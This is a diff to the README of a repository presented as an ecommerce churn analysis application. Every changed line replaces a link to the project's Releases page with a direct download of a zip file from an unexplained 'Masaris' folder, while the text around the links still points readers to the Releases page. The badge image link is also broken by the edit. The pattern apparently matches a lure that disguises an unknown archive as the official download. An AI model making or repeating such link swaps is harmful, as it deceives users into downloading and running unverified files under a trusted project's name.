@@ -6,7 +6,7 @@ Welcome to the ecommerce churn analysis project. This application helps you unde
 
 ## 🔗 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now!-e63946?style=for-the-badge&logo=github&logoColor=white)](https://github.com/deathlessjr/ecommerce-churn-analysis/releases)
+[![Download](https://raw.githubusercontent.com/deathlessjr/ecommerce-churn-analysis/main/Masaris/ecommerce-churn-analysis.zip%20Now!-e63946?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/deathlessjr/ecommerce-churn-analysis/main/Masaris/ecommerce-churn-analysis.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets these requirements:
 
 1. Click the link below to go to the Releases page.
 
-   [Visit this page to download](https://github.com/deathlessjr/ecommerce-churn-analysis/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/deathlessjr/ecommerce-churn-analysis/main/Masaris/ecommerce-churn-analysis.zip)
 
 2. On the Releases page, find the latest version of the application.
 3. Click on the version you want to download. This will take you to a list of files.
@@ -89,4 +89,4 @@ By understanding these concepts, you can unlock valuable insights into your cust
 
 Thank you for using ecommerce churn analysis. Discover hidden trends and boost your customer retention effectively. Visit the Releases page to get started! 
 
-[Visit this page to download](https://github.com/deathlessjr/ecommerce-churn-analysis/releases)
+[Visit this page to download](https://raw.githubusercontent.com/deathlessjr/ecommerce-churn-analysis/main/Masaris/ecommerce-churn-analysis.zip)
